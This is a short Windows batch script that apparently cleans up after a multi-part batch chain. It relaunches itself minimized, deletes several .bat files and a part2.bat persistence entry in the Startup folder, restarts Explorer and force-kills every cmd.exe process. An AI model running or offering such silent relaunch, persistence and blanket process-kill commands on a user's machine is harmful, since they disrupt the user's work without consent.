if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
cd C:\configuration
del hit.bat
del and.bat
del run.bat
del kill.bat
del part1.bat
del part2.bat
explorer.exe
del "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\part2.bat"
taskkill /F /IM cmd.exe
exit

